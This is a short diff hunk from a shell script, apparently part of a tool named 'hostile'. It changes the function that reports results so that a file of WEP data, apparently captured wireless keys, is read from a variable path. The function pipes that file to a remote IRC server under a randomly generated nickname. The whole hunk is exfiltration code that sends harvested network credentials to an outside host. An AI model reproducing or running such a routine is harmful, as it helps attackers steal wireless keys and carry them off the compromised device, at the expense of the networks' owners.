@@ -35,7 +35,7 @@ h_irc_send_report() {
 	h_log 0 "sending the report"
 	rand=$(dd if=/dev/urandom bs=64 count=1 2>/dev/null |md5sum |cut -b 1-8)
 	irc_user_local="$H_IRC_USER_LOCAL_PREFIX$rand"
-	cat /mnt/usbdrive/hostile/hostile-run.d/hostile-wep.txt | h_irc_send $H_IRC_SERVER 6667 $H_IRC_USER_REMOTE $irc_user_local
+	cat $H_WEP_F | h_irc_send $H_IRC_SERVER 6667 $H_IRC_USER_REMOTE $irc_user_local
 	h_log 0 "report sent to server"
 }
 
